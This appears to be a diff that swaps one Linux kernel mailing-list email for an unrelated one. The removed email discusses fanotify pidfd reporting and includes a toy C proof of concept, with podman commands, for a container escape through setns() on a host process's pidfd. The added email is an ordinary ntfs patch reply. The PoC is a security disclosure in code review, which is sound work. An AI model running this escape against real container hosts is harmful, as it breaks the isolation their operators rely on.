@@ -1,278 +1,183 @@
-Received: from mail-dy1-f195.google.com (mail-dy1-f195.google.com [74.125.82.195])
+Received: from mail-yx1-f46.google.com (mail-yx1-f46.google.com [74.125.224.46])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9BA548F7D
-	for <linux-fsdevel@vger.kernel.org>; Sat,  6 Jun 2026 23:45:38 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.195
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1780789540; cv=none; b=l4yCB59amacPgbSlpbQCyR/daIdtjiD0df+p0kgvFmPTlj1PU/bOtwulPQ/06WiUWGGXBzg3/JcgFPoDhrDItsB5otuSLs848/2lqhsyV+0G/DbjBHk0hdzVDhknJOG5Vf+m5oWGyqn5O1xvj4bNVRJYK45fvLYG4H+mI9tTrLM=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1780789540; c=relaxed/simple;
-	bh=G4YZOrcabSOrkJNhFlutXbGIsvCJ/hqhXX4rWTFYyQI=;
-	h=MIME-Version:Content-Type:Subject:From:To:Cc:In-Reply-To:
-	 References:Date:Message-Id; b=aBfz3rYfCZw5M6cocrfSFZV4uxXJaW9aRn7pi3yxWo/s9pmJyHL65OsvuBiWrY3anRMy1Af1XIfivnryo2hT+yF6RvTybinacYji2hetv7WS1l72oS9LXrIwkN6RCeLk6++O3EeqTMaZD5/v/EmcP93blBWq1owFfQe8N0vDyfA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=FuOAImHw; arc=none smtp.client-ip=74.125.82.195
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5B0CA2253EE
+	for <linux-fsdevel@vger.kernel.org>; Sun,  7 Jun 2026 00:00:26 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.224.46
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1780790427; cv=pass; b=hzrVQy4EbTMs+4ukBtTnCTpad9rcsqL1E317oR7SnWuyNAP6xpFccYPqRWXE+0bpDFGd4qXGLG4mwCiukrT5LvfuJBOS5LS52kpLOmrLMGwt+dqjFJuPnsbaYFCCc4Qu8jFjOQpFw5y3TKqVAuOtMsJjU3685hGSF7wevreBOv8=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1780790427; c=relaxed/simple;
+	bh=wo5MJ1kc34LNUuz5NAIVBZ7FOOwm8htL3ltn0HCZwy0=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=f60SwKEPyIhbc78UzhXNfSS098bgcaR8nR7F914cLNqmvVpp2FASqwb9gokHZrcqkOnl8W6SzsgpHq4HRDoux2cv1ZLk4Kbng9T4eiSMyZX3CPy67ejAqURdv8s/qgRKZbKhiWtvG4kZp4xTOZEA9u+t54TjOWD6IRPaPgF1WTI=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=nZYC+se9; arc=pass smtp.client-ip=74.125.224.46
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="FuOAImHw"
-Received: by mail-dy1-f195.google.com with SMTP id 5a478bee46e88-304cf518c9dso3913114eec.1
-        for <linux-fsdevel@vger.kernel.org>; Sat, 06 Jun 2026 16:45:38 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="nZYC+se9"
+Received: by mail-yx1-f46.google.com with SMTP id 956f58d0204a3-66042e1ad22so155311d50.1
+        for <linux-fsdevel@vger.kernel.org>; Sat, 06 Jun 2026 17:00:26 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1780790425; cv=none;
+        d=google.com; s=arc-20240605;
+        b=kVYD2lKS6M1HvU85sNcw6iQw1HlU5ILzAQL1yGzyULcOnNUYMMpkXAaX+LUxkv/PlB
+         erZFvtent5JL8td8iC0q43ptZiQmFLITadJD/HoWGEOQkFYVFlSj+ZYrIrnkuZdaxDsG
+         IErNw/0gxWEUujosS2dQTcp0HT5H/KoV239Y40lFgkymygIzQk2sgBSEa88LqDRRWfSY
+         B1tDFFlpNmfK3fF1iP3V6cFAiHHN+27mAk6OtAmN6Gt0oFfpOLCiHvxDiZ6hlfwm9qWJ
+         417I71nyGbl3saTbLFnNv+K6bGOBhq+Ku+GOyJEtb6m5ZaRKxxI8biviyGamAsNkQWx9
+         QVSg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=R/hCJs147ToPFiUHfg+hj1HTRG41gZsskdp6jaxbY0s=;
+        fh=nMgzSZCuqL9QYQt+YNW2sGmc6uWhuBFQ7YHLMXHNsTM=;
+        b=DTn+DQKRq4wEnnncbeW9Z0Td+p1YCvFSurq+px29mp9bvpQ2AmmiGmCyE9Mf3TGDbC
+         SbVHAuL4fP6Ikes2jnUT4r5vaBKcunG9WXnEQuW1Eo0BWuM1S2Exm3obl3TneR+mFr2g
+         rW3Do3E58BTAkxIlX3/xxMhGcNZPF06sZQ73Bz4GpnlSQnyWC7Mp9KKtzJ4xFY+9eweB
+         wR7y9FYrAVhaT6y2ecNWTtE06jWrAhM9+Zo3aNXDMe9zaRvPGLXHYIdjuP2pVArIfNji
+         1dfy2CVg6rMPmoB8VQC/hfiflGhB8uq5kt3ASjfDNE9LGMe6isG/vwAMMu/UUscsu5/m
+         0TTw==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1780789538; x=1781394338; darn=vger.kernel.org;
-        h=message-id:date:references:in-reply-to:cc:to:from:subject
-         :content-transfer-encoding:mime-version:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1780790425; x=1781395225; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
          :message-id:reply-to;
-        bh=BLjL7+D0ycBm00UEjNAqeKyeq7fIjQIPizeWixfZ1vk=;
-        b=FuOAImHwR54YAsnS0a67iM9mfFyqcw9uKsCO1NkWa4Mk7wUhLpmtw/f9ufE7GCrPpF
-         pzHZrc05jTissw8RldILWwp8J/sMeJvGfpKvdcLWUqd6GsiNMavHZBjAfEapU19zSgVG
-         LNVjHrLSaeVZYenBQ4w6YiLHjhCIwUHCwlmWAguC8qeTXY/nrNKHrk6PCU5tNL8+48T0
-         7z0XkC93RQQLr3oYc3zv681LxHtEm050oAi9HdfMrIj7vKO32TCPL/fX8Tq/UOH3fZNh
-         bn5Tk9huPDqFdTAs5nYOy35A3sgJJTPCOUBjzSiWQaUVY0+ywxTe9J85fZWFwMXCXkO7
-         24GA==
+        bh=R/hCJs147ToPFiUHfg+hj1HTRG41gZsskdp6jaxbY0s=;
+        b=nZYC+se9rn2FtlGEj5LrMhELmWAGr+DZlAthY69HVS2k2slUhHUGdEieobGdSwaIzN
+         aN8ycU8uGVdvaEKE41v3Xfw+sL6ZiSp3dw3LjaR/ArWTCjg9hWh01Huf6eonem0KX914
+         yAXBpGSDb1ClAPEfZKGAdfuAj/O8DR87eipWfup5f3xdVM4sJRFqx8LjEMsiqEteS5nk
+         +/N9/I5s8YKAkPD6L4rCtVMMSoUiYdI/63buhDHbMTq1v+9qT4b+yw1Rt26NFn3EcPHg
+         T0qhKMxnZ6xu68LJVbrRMSjb0meLi1GmDrLzCtyf7zvsSh3KQ4DVnEwm01xraJoiGsmK
+         y37A==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1780789538; x=1781394338;
-        h=message-id:date:references:in-reply-to:cc:to:from:subject
-         :content-transfer-encoding:mime-version:x-gm-gg:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=BLjL7+D0ycBm00UEjNAqeKyeq7fIjQIPizeWixfZ1vk=;
-        b=GOnxr8tOd5a5Jn5k6f9hdKWNcxeZZ2OpKWkceNGdw8n5dkBjOI/pmzp0/GvHhbt+z7
-         LbhOnROSj4EneBWXqS8hTJKGwKGOLR9k3Rv9GbauBf5+kzwbICIhxlegx7PEGzKT7dUM
-         5+SUyKcI0XnSvMdzPrCyMYrerEtUFb+0pOwFxA9JUiDXEe+ymZ9Jd9yeEx8M0yxCMuOC
-         pl26TmSJRBvsDaLfE6aX+hGBWl38FbmwLY//5WerBESPwirrJkJv2G22A9kL3htKPGML
-         4WKD9XYtLlWWDsKSFOpa1Zkjm2G2AGY74gdzF1/8BWtP5Vv73P6JC2PZMfZ/oc6pX/zI
-         T3RA==
-X-Forwarded-Encrypted: i=1; AFNElJ/3W9EKvkvcUnpcC0PF2qsHu+fNi1leG84VEPByDDQccI54AhtmbEs/RFUO0Sln0RfCw10Nd/cCX+slcHaR@vger.kernel.org
-X-Gm-Message-State: AOJu0YyP2oq1w+/nxABu/KsUlR3j83H7FbCGUm79Qq0+XWIv/wr/vqRN
-	hot77XYse+t3ABZa6v+gpOlSWQFBicyxhImyQT3J5YIW/hFcVRK+wt8J
-X-Gm-Gg: Acq92OH8NZgNPRRGtSeqjgjGD0zp70uSCA2ydK+sTf7PTHUMu/M65+jQfkxQpxUDgqV
-	yTj8n9iT6IKXKeN+sK748au6vNSJkI4FFqu18kfw1siM8PPNHeDlM7ApkHKx7XmrLqZqqBiTKzV
-	drCQWc3Rq4EhS2a4UQcHw2kgxYHB+PdotcAC62OXO/tgHPxLNAWyPCgBmiZ3TY0ZXChz732AAvI
-	U3cyDqkRC5PvmwrB6ewRDhZe3jB/CyZgBJ9knQfdjJXAeG7+RGYpaGp9heMGnMHE/kaBxDo+VzZ
-	kem/beQ7B4IIQ85ECe97eNtaB6rkDdOI/fWLj2QPOxcVnkzkUb77tVHHrGhcRQNSHT435IwSqwJ
-	hOmm7s97BEXcSA/zPnJh4+ufsqv6YUwvuLiS021QDaPZEYXXA/9aaT84dV396wI6CuSHYiZ5RQ9
-	Lm1Ud92n992wLBAoNFTj5ESoSN81ORs/in43u+/Gk=
-X-Received: by 2002:a05:7300:5710:b0:307:34f9:cc9 with SMTP id 5a478bee46e88-3077ae88144mr5207158eec.2.1780789537476;
-        Sat, 06 Jun 2026 16:45:37 -0700 (PDT)
-Received: from [10.61.22.100] ([2605:52c0:2:2f27:be24:11ff:fe89:6f0f])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3074dcad34esm17273830eec.11.2026.06.06.16.45.35
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 06 Jun 2026 16:45:37 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1780790425; x=1781395225;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=R/hCJs147ToPFiUHfg+hj1HTRG41gZsskdp6jaxbY0s=;
+        b=blfL8a2Gi15xXJipUV6D3T5tJnrZXI4Dx5RJuilS9lYeMHAUgOTyC2+sHtRygvjJCd
+         4NzFU00g+v3QF0+kLLC3fsZiWSVstZdII3rXNzliGAQbjc8xok5wLrrXY8OfgpsLBE9p
+         AeRX+vnn/grZCr8mB2qSRc+Y4+hW8GF36qUBArJO/npvo4kLAH1HUgW5ii5h45DkvnMr
+         LsMhHq3oHWPmu0vCOy3Quuhcy9FujWPcTvtmtnSn/UuM3YBqPlSBtmnBf/isU+Jn/fag
+         EClfA9VhWXaO37UJYaKYNYDZdbttIggN7vtGIzBsroGOQodUcCBxIFutyaCPzIkEeAv2
+         rv7Q==
+X-Forwarded-Encrypted: i=1; AFNElJ+3AfQbiFwH0ntWxJLxCxBh+/MS3DBVzvObS0Qbp6UfkHF4v2o1KEq5vuE5eqnho/SzFUfeDCd28yOEkap4@vger.kernel.org
+X-Gm-Message-State: AOJu0YwUqCqF6cEGO0pzsoU6YQ9tb/8KA9mMt4arCvpuHsfxv64swLga
+	lv1r0usyNQyxaYCDXC8wBb+9R6L4sQ8iQHP25f1D7uErPRacp7w6oOjCpkpmi5PRb9ic33hab8b
+	8yO3zLqKa+UGDDsEv0JWcjjMzBlFb18LXhp4x
+X-Gm-Gg: Acq92OHSxn1Ikwjc1eDCK8CWWranXFzkfdEyZbN/DxK90wGuEisgIQFV+9SDSTUxMwI
+	kYgTyd78jmr7zVlMeqIiGTwMC9DSSjw1JSiGd99MzPOr9BWhWcE9EeidYOVy4BfpBjwN0GDbgqs
+	urZ6CJqESdcrqA2cgwa1bua/BpHiu4rkkO+zFvHfb494OtIpbqQEFZxBCTE9y2gI6gbUdt0NS5/
+	DJJUXLtCHofNQRjCzQjLsWPx+x/JLJPmhc0vVET39JUInygNQOpsrBo8tzxMzHlfOm57cEuPChN
+	W9AaXmofKeLcCAxUHg==
+X-Received: by 2002:a05:690e:168f:b0:653:1298:2757 with SMTP id
+ 956f58d0204a3-66106f2fc61mr5005286d50.3.1780790425151; Sat, 06 Jun 2026
+ 17:00:25 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 List-Id: <linux-fsdevel.vger.kernel.org>
 List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
-Subject: Re: [PATCH v4 2/2] fanotify: allow reporting pidfds for reaped
- tasks
-From: AnonymeMeow <anonymemeow@gmail.com>
-To: Christian Brauner <brauner@kernel.org>
-Cc: AnonymeMeow <anonymemeow@gmail.com>, 
- Amir Goldstein <amir73il@gmail.com>, jack@suse.cz, 
- linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
-In-Reply-To: <20260605-inwiefern-flugbereit-reintreten-9ff8d18b642d@brauner>
-References: <20260603001516.26234-3-anonymemeow@gmail.com>
- <20260603031117.20950-1-anonymemeow@gmail.com>
- <CAOQ4uxgudh_W2Gcs5qqGce8yO6503yjrGzEwbjTKkT+DLAqufA@mail.gmail.com>
- <20260603-schindel-drehzahl-planlos-e334e6899cd5@brauner>
- <CAOQ4uxgEnD6aN4HTh14=SPzU25_2xOXxfnY+60udOqNp3nnm4w@mail.gmail.com>
- <20260603-mehrsprachig-altlasten-unverantwortlich-4fcd029306b0@brauner>
- <178060498710.12657.15047020114378440191.b4-reply@b4>
- <20260605-inwiefern-flugbereit-reintreten-9ff8d18b642d@brauner>
-Date: Sun, 07 Jun 2026 07:45:21 +0800
-Message-Id: <178078952175.93110.16695082677701348131.b4-reply@b4>
-X-Mailer: b4 0.15.2
-X-Developer-Signature: v=1; a=openpgp-sha256; l=7738; i=anonymemeow@gmail.com;
- h=from:subject:message-id; bh=G4YZOrcabSOrkJNhFlutXbGIsvCJ/hqhXX4rWTFYyQI=;
- b=owGbwMvMwCWmOm1nep3jlf+Mp9WSGLJUNgp76i88aud33/R3lK7bDdNWj5xoPvOlDybcCNCsd
- 3nTGb+zo5SFQYyLQVZMkeWNo4D2o88b7xS8f88PM4eVCWQIAxenAEzkfjojQ4tVY/Zeqe/FGyfH
- sPAxOjdO0pM/lnu0L/Hi6dkn5kxxuMXwP/m/TEVWdmqHXUvH+8uPbXIrM3a8mXzhA8vV5sfnxS9
- VsQEA
-X-Developer-Key: i=anonymemeow@gmail.com; a=openpgp;
- fpr=EC41102BE2F3B1DC70EFEF0F2596B9677E41D4FF
+References: <20260530143514.3083601-1-charsyam@gmail.com> <CAKYAXd-MxgdSfr+rmu96JYicyv6JS9m-ZosiS-RwU+C-79XXyA@mail.gmail.com>
+In-Reply-To: <CAKYAXd-MxgdSfr+rmu96JYicyv6JS9m-ZosiS-RwU+C-79XXyA@mail.gmail.com>
+From: CharSyam <charsyam@gmail.com>
+Date: Sun, 7 Jun 2026 09:00:10 +0900
+X-Gm-Features: AVVi8Cc1BxRgDiJOTI2-8jhZmWP8fekVllDCrujbGdkVvscxdn2ZrojnhBA_uyw
+Message-ID: <CAMrLSE4ztrMttNjrtTymQVoz=KhL+ELLMm71-QUZxeP0VEapPw@mail.gmail.com>
+Subject: Re: [PATCH v4 0/6] ntfs: validate attribute values on lookup
+To: Namjae Jeon <linkinjeon@kernel.org>
+Cc: Hyunchul Lee <hyc.lee@gmail.com>, linux-fsdevel@vger.kernel.org, 
+	linux-kernel@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-On 2026-06-05 09:54 +0200, Christian Brauner wrote:
-> On Fri, Jun 05, 2026 at 04:29:47AM +0800, AnonymeMeow wrote:
-> > On 2026-06-03 13:25 +0200, Christian Brauner wrote:
-> > > On Wed, Jun 03, 2026 at 12:58:09PM +0200, Amir Goldstein wrote:
-> > > > On Wed, Jun 3, 2026 at 12:28 PM Christian Brauner <brauner@kernel.org> wrote:
-> > > > >
-> > > > > On Wed, Jun 03, 2026 at 12:00:42PM +0200, Amir Goldstein wrote:
-> > > > > > On Wed, Jun 3, 2026 at 5:11 AM AnonymeMeow <anonymemeow@gmail.com> wrote:
-> > > > > > >
-> > > > > > > Sashiko said that pidfs_register_pid() can fail under memory pressure,
-> > > > > > > since it allocates memory using GFP_KERNEL without a way to pass in
-> > > > > > > __GFP_NOFAIL. This can cause fanotify_alloc_event() to silently drop
-> > > > > > > the event even when the group has an unlimited queue length.
-> > > > > > >
-> > > > > > > Should we make pidfs registration best-effort instead and still return
-> > > > > > > the allocated event if pidfs_register_pid() fails? But IMO this will
-> > > > > > > make the API semantically ambiguous. If the kernel guarantees that the
-> > > > > > > event pid is registered with pidfs when pidfd reporting is requested,
-> > > > > > > then a later FAN_NOPIDFD or -ESRCH can only be caused by the task being
-> > > > > > > invisible within the reader's pid namespace. But if we allow best-effort
-> > > > > > > registration, the event may still carry a pinned struct pid, but pidfs
-> > > > > > > registration may have failed due to memory pressure. If userspace reads
-> > > > > > > the event after the task has been reaped, it still gets a FAN_NOPIDFD
-> > > > > > > or -ESRCH due to failed pidfs registration caused by memory pressure,
-> > > > > > > IMO this should be reported as a -ENOMEM instead of -ESRCH. But
-> > > > > > > currently it seems we don't have a good way to register the pid with
-> > > > > > > __GFP_NOFAIL or __GFP_RETRY_MAYFAIL, so what would be the preferred
-> > > > > > > approach to handle this situation?
-> > > > > >
-> > > > > > Thanks for noticing the oddity and explaining the options.
-> > > > > >
-> > > > > > We could fail the event in case on ENOMEM because the system
-> > > > > > is likely is a bad shape anyway and other events are likely to fail
-> > > > > > allocation themselves, so I am not objecting to your patch as is,
-> > > > > >
-> > > > > > but I am slightly leaning towards the semantically ambiguous API.
-> > > > >
-> > > > > As usual, I think a semantically ambiguous api should be avoided.
-> > > > >
-> > > > > > I don't think that we are going to change the man page to say that
-> > > > > > FAN_REPORT_PIDFD is guaranteed to return a pidfd, maybe we just
-> > > > > > add a NOTE about increased likelihood of getting a pidfd since kernel XXX
-> > > > > > and mention the known cases of pid namespace and ENOMEM.
-> > > > >
-> > > > > The pid namespace shouldn't matter.
-> > > > 
-> > > > DO you mean that the event reader inside a pidns always gets a pidfd but
-> > > > it will not be able to query the pid of the process outside the pidns
-> > > > or do you mean something else?
-> > > 
-> > > So they will always get a pidfd since fanotify is correctly using
-> > > pidfd_prepare() directly. But when the reader tries to resolve the pidfd
-> > > to say a pid or retrieve info via the pidfd info ioctl they would fail
-> > > to do so (well, the pid will resolve to 0 which is the global indicator
-> > > for "can't be resolved in your pidns").
-> > > 
-> > 
-> > Before pidfd_prepare(), fanotify checks whether metadata.pid is
-> > non-zero, i.e. whether the event pid is visible in the reader's pidns.
-> > If it's not visible, fanotify will not create a valid pidfd and return a
-> > FAN_NOPIDFD. This is the existing behavior, and my patches do not change
-> > it.
-> 
-> We can hand that out. That's another change we should consider. The
-> pidfd works even if the pid namespace is outside the caller's hierarchy.
-> 
+Hi Namjae,
 
-I may be missing something, but I am concerned that lifting this
-restriction could have security implications... Because it could weaken
-the isolation provided by pidns. In the usual case, a task inside a
-pidns cannot actively obtain a reference to tasks outside of that ns. If
-fanotify is allowed to hand out pidfds across pidns boundaries, a task
-inside the ns may be able to obtain access to resources that were
-supposed to be isolated from it, such as other tasks' namespaces.
+Thanks for applying patches 0001 through 0004.
 
-One possible attack surface I can think of is container escape. I wrote
-a small toy PoC which escapes from a podman container using this
-mechanism. Admittedly, the PoC requires sudo as well as SYS_ADMIN and
-SYS_PTRACE caps, so it is not practical by itself. However, I am worried
-that in other circumstances this could become a real attack surface.
+Skipping 0005/0006 for now makes sense. After re-checking the
+generic/013 failure, I found that v4 only fixed one side of the
+$INDEX_ROOT resize ordering. Patch 0005 handled the shrink side in
+ntfs_ir_truncate(), but v4 missed the grow side in ntfs_ir_reparent():
+the code could publish a larger index_length/allocated_size before the
+resident value was grown. If that resize then hit -ENOSPC, the recovery
+path could re-lookup a transiently inconsistent $INDEX_ROOT.
 
-I'm no expert in this area, so I do not think I am in a good position to
-make that call myself... For now, I'm not planning to include removal of
-this restriction in my patch set.
+So 0005 was not intended as a workaround, but it was incomplete as a
+prerequisite for the $INDEX_ROOT validator. I will send the remaining
+$INDEX_ROOT work as a small v5 follow-up series on top of the tree with
+0001-0004 applied.
 
-With Best Regards,
-Anonymemeow
+For the allocated_size question: the driver currently consumes
+index.allocated_size as the usable capacity of the shared index_header,
+including resident $INDEX_ROOTs. ntfs_ie_add() uses it to decide whether
+an insertion can be done in place or whether the root has to grow, and
+ntfs_ie_insert() does not re-check the resident value boundary. So I
+think the validator should still reject allocated_size values that extend
+past the resident index area.
 
----
+The extent-inode lifetime race I found while testing is independent, so
+I will send that separately instead of mixing it into this series.
 
-PoC code:
+Thanks,
+DaeMyung
 
-// toy.c
-
-#define _GNU_SOURCE
-
-#include <sys/fanotify.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/pidfd.h>
-#include <sched.h>
-
-int main()
-{
-    int fanotify_fd = fanotify_init(FAN_REPORT_PIDFD, 0);
-    if (fanotify_fd < 0) {
-        perror("fanotify_init");
-        exit(1);
-    }
-
-    int ret = fanotify_mark(fanotify_fd, FAN_MARK_ADD | FAN_MARK_FILESYSTEM, FAN_ACCESS, 0, "/etc/resolv.conf");
-    if (ret < 0) {
-        perror("fanotify_mark");
-        exit(1);
-    }
-
-    for (;;) {
-        char buffer[65536];
-        int len = read(fanotify_fd, buffer, sizeof(buffer));
-        if (len < 0) {
-            perror("read");
-            break;
-        }
-
-        struct fanotify_event_metadata *metadata = (struct fanotify_event_metadata*)buffer;
-
-        while (FAN_EVENT_OK(metadata, len)) {
-            unsigned int offset = metadata->metadata_len;
-
-            while (offset < metadata->event_len) {
-                struct fanotify_event_info_header *info_hdr = (struct fanotify_event_info_header*)((char*)metadata + offset);
-
-                if (info_hdr->info_type == FAN_EVENT_INFO_TYPE_PIDFD) {
-                    struct fanotify_event_info_pidfd *pidfd_info = (struct fanotify_event_info_pidfd*)info_hdr;
-
-                    if (setns(pidfd_info->pidfd,
-                        CLONE_NEWNS |
-                        CLONE_NEWCGROUP |
-                        CLONE_NEWUTS |
-                        CLONE_NEWIPC |
-                        CLONE_NEWNET
-                    )) {
-                        perror("setns");
-                        exit(1);
-                    }
-
-                    int mntinfo_fd = open("/proc/self/mountinfo", O_RDONLY);
-
-                    len = read(mntinfo_fd, buffer, sizeof(buffer));
-                    if (len < 0) {
-                        perror("read");
-                        exit(1);
-                    }
-
-                    printf("%s\n", buffer);
-
-                    exit(0);
-                }
-
-            offset += info_hdr->len;
-            }
-
-            close(metadata->fd);
-
-            metadata = FAN_EVENT_NEXT(metadata, len);
-        }
-    }
-
-    close(fanotify_fd);
-    return 0;
-}
-
-# gcc toy.c -o toy
-# sudo podman run --rm --cap-add SYS_ADMIN,SYS_PTRACE -v ./toy:/root/toy debian:latest /root/toy
-
-This PoC marks the fs backing the bind-mounted /etc/resolv.conf, which
-in this setup is the host /run mount. This means when a process in the
-host mntns accesses a file under /run, the program gets a chance to
-receive its pidfd and call setns() on it, accomplishing the container
-escape.
-
+2026=EB=85=84 6=EC=9B=94 6=EC=9D=BC (=ED=86=A0) =EC=98=A4=EC=A0=84 12:30, N=
+amjae Jeon <linkinjeon@kernel.org>=EB=8B=98=EC=9D=B4 =EC=9E=91=EC=84=B1:
+>
+> On Sat, May 30, 2026 at 11:35=E2=80=AFPM DaeMyung Kang <charsyam@gmail.co=
+m> wrote:
+> >
+> > This v4 supersedes the previous single-patch v3. Per review, it expands
+> > the lookup-time attribute value validation into a series so $VOLUME_NAM=
+E
+> > and $INDEX_ROOT can be validated safely.
+> >
+> > The first patch keeps the original $FILE_NAME corruption fix and moves
+> > the duplicated non-resident mapping-pairs metadata checks into the comm=
+on
+> > attribute value validator. It also keeps resident value matching in the
+> > external attribute lookup path on the actual value length and fixes the
+> > matching attrlist duplicate check for resident attributes. The next
+> > patches prepare the volume label write and mount read paths to cope wit=
+h
+> > a rejected $VOLUME_NAME, add $VOLUME_NAME validation, fix the
+> > ntfs_ir_truncate() shrink ordering issue, and then enable $INDEX_ROOT
+> > validation.
+> >
+> > Changes since v3:
+> > - Expand the single patch into a 6-patch series as requested.
+> > - Keep corruption messages using numeric attribute types and drop the
+> >   attribute type name helper.
+> > - Move non-resident mapping-pairs metadata validation into the shared
+> >   ntfs_attr_value_is_valid() helper.
+> > - Preserve resident @val matching in ntfs_external_attr_find() using th=
+e
+> >   actual resident value length, and avoid reading the non-resident
+> >   lowest_vcn union member when checking resident attrlist duplicates.
+> > - Make ntfs_write_volume_label() add a replacement only after successfu=
+l
+> >   removal or after -ENOENT, and propagate other lookup/removal errors.
+> > - Reinitialize the mount-time search context before the
+> >   $VOLUME_INFORMATION lookup, since a rejected $VOLUME_NAME leaves the
+> >   context in an undefined state.
+> > - Add $VOLUME_NAME-specific validation, and reject non-resident
+> >   $VOLUME_NAME records like non-resident $FILE_NAME.
+> > - Include the ntfs_ir_truncate() shrink ordering fix.
+> > - Add $INDEX_ROOT-specific validation on top of the shrink fix.
+> >
+> > DaeMyung Kang (6):
+> >   ntfs: validate attribute values on lookup
+> >   ntfs: do not replace volume name after lookup errors
+> >   ntfs: reinit search context before volume information lookup
+> >   ntfs: validate resident volume name values on lookup
+> >   ntfs: update index root allocated size before shrink
+> >   ntfs: validate resident index root values on lookup
+> I have applied patches 0001 ~ 0004 first, as we are continuously
+> receiving similar patches. I skipped patch 0005 for now since it seems
+> like a workaround, and as you know, 0006 patch couldn't be applied due
+> to xfstests failures.
+> Thanks!
